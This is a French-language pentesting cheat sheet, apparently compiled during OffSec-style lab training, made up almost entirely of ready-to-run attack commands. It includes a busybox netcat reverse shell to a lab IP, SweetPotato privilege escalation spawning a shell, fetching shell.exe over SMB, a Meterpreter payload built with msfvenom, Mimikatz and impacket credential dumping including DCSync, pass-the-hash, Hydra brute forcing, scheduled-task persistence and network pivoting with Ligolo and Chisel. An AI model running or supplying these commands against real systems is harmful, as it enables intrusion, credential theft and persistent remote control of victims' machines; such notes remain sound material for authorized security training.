# Cookbook

---

## Linux

Sous linux, dégager les fichiers de type data et répertoire
```bash
find . -exec file {} \; | grep -v -E ': data|directory'
```

---

## Ports

Voir les ports en écoute :
```bash
sudo ss -ntplu
```

Windows :
```cmd
netstat -ano
netstat -b -a -o
```

---

## SMB

Mettre à dispo un share smb :
```bash
smbserver.py a . -smb2support
```

Sur la machine cible :
```cmd
copy \\192.168.49.106\a\shell.exe Remote.exe
```

Explorer share SMB :
```bash
smbclient //192.168.195.248/transfer --user offsec%lab
```

```bash
recurse ON
prompt OFF
mget *
```

Monter le share :
```bash
sudo mount //192.168.195.248/transfer ./mnt -o username=offsec
```

Script smbmap :
```bash
python2 ./smbmap.py -R -u "aaa" -p "" -H 10.10.10.178
```

---

## CVE / Kernel

Ex :
```
5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
```

Kernel : 5.15.0-52-generic  
Ubuntu : 5.15.0-52.58  

https://changelogs.ubuntu.com/changelogs/pool/main/l/linux/linux_5.15.0-52.58/changelog

Commandes :
```bash
lsb_release -a
cat /etc/os-release
```

Puis :
https://ubuntu.com/security/CVE-2022-0847

---

## NetExec / CrackMapExec

```bash
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e ...'
```

```bash
nxc smb 192.168.170.248 -u Administrator -H HASH --shares
nxc smb 192.168.170.248 -u Administrator -H HASH --users
nxc ldap 192.168.170.248 -u Administrator -H HASH -M get-desc-users
nxc ldap 192.168.170.248 -u Administrator -H HASH --password-not-required --admin-count --users --groups
```

Anonymous :
```bash
nxc smb 10.10.10.10 -u '' -p '' --shares
nxc smb 10.10.10.10 -u '' -p '' --users
nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users
```

---

## Python venv

```bash
python3 -m venv mon_env
source mon_env/bin/activate
```

---

## Git

```bash
git log
git show <commit>
```

---

## Reverse Shell

Upgrade shell :
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Busybox :
```bash
busybox nc 192.168.45.156 12345 -e sh
```

---

## SNMP

```bash
snmpbulkwalk -v2c -c public 192.168.129.156 -Oa 1 | grep -i pass
```

---

## Nmap

```bash
sudo nmap -sC -sV -oN scan.txt IP
sudo nmap -sC -sV -sU -oN scan IP
sudo nmap -p- -sC -sV IP
```

Méthode LG :
```bash
nmap "--script=default or smb-vuln* or smb-enum-users or vulnscan or ldap-rootdse" -O -p- -vvv -T4 --reason
```

---

## Logging

```bash
script -a log.txt
```

## Impacket

```bash
impacket-psexec -hashes HASH user@IP
```

DCSync :
```bash
impacket-secretsdump -just-dc-user dave domain/user:pass@IP
```

SAM dump :
```bash
impacket-secretsdump -sam sam -system system LOCAL
```

---

## Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

One-liner :
```bash
.\mimi.exe "log mimi.txt" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

---

## Hashcat

```bash
hashcat -m 1000 hash.txt rockyou.txt
hashcat -m 1000 hash.txt rockyou.txt -r best64.rule
```

---

## FFUF

```bash
ffuf -u http://site/FUZZ -w wordlist.txt -fc 302
```

Extensions :
```bash
-e .html,.php,.asp,.js,.txt
```

Recursive :
```bash
-recursion -recursion-depth 2
```

POST :
```bash
ffuf -X POST -request req.txt -w users.txt:USER -w pass.txt:PASS
```

---

## Hydra

```bash
hydra -l user -P rockyou.txt ssh://IP
```

HTTP :
```bash
hydra http-post-form "/index.php:user=^USER^&pass=^PASS^:fail"
```

RDP :
```bash
hydra -L names.txt -P rockyou.txt rdp://IP
```

---

## Windows

```cmd
whoami /priv
systeminfo
route print
netstat -ano
```

---

## PowerShell

```powershell
Get-ChildItem -Force
Get-History
Get-Process
```

Recherche fichiers :
```powershell
Get-ChildItem -Recurse -Include *.kdbx
```

Recherche string :
```powershell
Select-String -Pattern "password"
```

---

## Reverse PowerShell

```powershell
powershell -enc BASE64
```

---

## RDP Enable

```powershell
Set-ItemProperty -Path 'HKLM:\System\...' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

---

## Evil-WinRM

```bash
evil-winrm -i IP -u user -p pass
```

---

## Services & Tasks

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-CimInstance win32_service
```

---

## NFS

```bash
showmount -e IP
sudo mount -t nfs IP:/share ./mnt
```

---

## SweetPotato

```cmd
SweetPotato.exe -e EfsRpc -p nc.exe -a "IP PORT -e cmd"
```

---

## Curl

```bash
curl http://target --data-urlencode "cmd=id"
```

---

## Pass-the-Hash

```bash
impacket-wmiexec -hashes HASH user@IP
```
## RDP

```bash
xfreerdp3 /u:user /p:pass /v:IP
```

---

## Serveurs

```bash
python3 -m http.server 80
```

---

## Ligolo

```bash
ip tuntap add user kali mode tun ligolo
ip route add 10.10.0.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:83
```

Agent :
```bash
agent.exe -connect IP:83 -ignore-cert
```

---

## Chisel

```bash
chisel server -p 8000 --reverse
chisel client IP:8000 R:1080:socks
```

---

## Persistence

```powershell
schtasks /create /sc minute /mo 1 /tn task /tr script.ps1
```

---

## Metasploit

```bash
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=IP LPORT=443 -f psh
```

---

## Rlwrap

```bash
rlwrap nc -lvnp 4444
```

---

## WinRM

```powershell
Add-LocalGroupMember -Group "Remote Management Users" -Member user
```

```powershell
winrm get winrm/config
```
